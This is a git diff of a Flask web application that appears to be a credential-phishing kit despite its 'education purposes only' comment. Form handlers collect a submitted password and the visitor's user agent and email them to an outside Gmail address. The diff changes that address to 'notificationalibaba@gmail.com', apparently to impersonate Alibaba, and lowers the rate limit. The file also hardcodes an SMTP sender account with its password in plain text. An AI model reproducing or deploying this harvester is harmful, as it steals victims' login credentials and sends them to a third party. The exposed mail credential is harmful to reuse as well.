@@ -15,7 +15,7 @@ from email.mime.multipart import MIMEMultipart
 # made for education purposes only
 
 app = Flask(__name__)
-limiter = Limiter(get_remote_address, app=app, default_limits=["10 per day", "10 per hour"])
+limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
 secret_keyx = secrets.token_urlsafe(24)
 app.secret_key = secret_keyx
 
@@ -193,7 +193,7 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "auto528@cryptasphere.bio"
         sender_emaill = "auto528"
-        receiver_email = "danielnewwoj@gmail.com"
+        receiver_email = "notificationalibaba@gmail.com"
         password = "vip7a81be0e2b36"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -233,7 +233,7 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "auto528@cryptasphere.bio"
         sender_emaill = "auto528"
-        receiver_email = "danielnewwoj@gmail.com"
+        receiver_email = "notificationalibaba@gmail.com"
         password = "vip7a81be0e2b36"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
